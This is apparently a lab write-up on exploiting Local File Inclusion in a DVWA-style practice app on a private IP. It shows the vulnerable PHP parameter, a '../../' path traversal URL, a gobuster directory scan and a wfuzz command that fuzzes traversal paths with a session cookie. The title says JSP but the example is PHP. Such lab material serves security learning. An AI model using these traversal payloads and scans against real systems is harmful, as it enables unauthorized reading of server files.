<img width="895" height="732" alt="image" src="https://github.com/user-attachments/assets/f743102d-05d5-4b8c-8c0a-4137ed37c3eb" /># LFI With JSP



## What is Local File Inclusion (LFI)?
Local File Inclusion (LFI) is a vulnerability that allows an attacker to include and execute files stored on the server — typically by manipulating input parameters that control which file is loaded.


## Why JSP Applications Are Vulnerable
JSP applications are often built on Java EE / Jakarta EE frameworks like:
  - Apache Tomcat
  - Jetty
  - WildFly
  - IBM WebSphere
  - Oracle WebLogic




## LFI with JSP of File Inclusion Methodology
- So this our `Target URL`: http://192.168.100.97:8080/vulnerabilities/fi/?page=include.php
<img width="1337" height="809" alt="image" src="https://github.com/user-attachments/assets/cbe9c330-f375-4148-b860-abcde6c05128" />


### View Source
<img width="826" height="509" alt="image" src="https://github.com/user-attachments/assets/7c43d3b3-3bbb-4a4c-b5ec-25721a180588" />

- Breakdown:
````
<?php
// The page we wish to display
$file = $_GET['page'];
?>
````
- This line grabs the value of the page parameter from the URL:
````
http://192.168.100.97:8080/vulnerabilities/fi/?page=somefile
````
- - Whatever you pass as `page=...` gets assigned to the `$file` variable.
- In the full vulnerable version (not shown here), this variable is likely used in an `include()` or `require()` statement like:

````
include($file);
````
- That’s where the danger comes in.

---


- In our `Target` if i change `URL`:
````
http://192.168.100.97:8080/vulnerabilities/fi/?page=file1.php
````
<img width="895" height="732" alt="image" src="https://github.com/user-attachments/assets/dcee995c-e536-4eea-a1ca-82c226142265" />


````
http://192.168.100.97:8080/vulnerabilities/fi/?page=../../hackable/flags/fi.php
````
<img width="1921" height="865" alt="image" src="https://github.com/user-attachments/assets/eee53bce-7f74-43b7-8797-6edf7e623bca" />



## Test workflow

### Discovery with Gobuster/Dirsearch
#### Directory discovery 
````
gobuster dir -u http://192.168.100.97:8080 -w /usr/share/wordlists/dirb/common.txt
````
<img width="806" height="527" alt="image" src="https://github.com/user-attachments/assets/fd27cc82-d08e-4b0c-b2f4-dd8e7fc76a42" />



### wfuzz
- Check cookie:
   - Righ-Click -> Inspec
<img width="1916" height="531" alt="image" src="https://github.com/user-attachments/assets/38818483-3a3a-4af6-9ce1-72c73f9d2a80" />



````
wfuzz -c -w /usr/share/wordlists/wfuzz/general/common.txt -b "security=low; PHPSESSID=pr6d8jd1ldbrei4lvm133gvdq3" "http://192.168.100.97:8080/vulnerabilities/fi/?page=../../hackable/flags/FUZZ.php"
````
<img width="1762" height="814" alt="image" src="https://github.com/user-attachments/assets/5d5535b3-814d-4df0-a8f9-b7c525762743" />

<img width="603" height="803" alt="image" src="https://github.com/user-attachments/assets/423adda9-eed2-4ebc-a1ec-fed99eaa39f5" />




















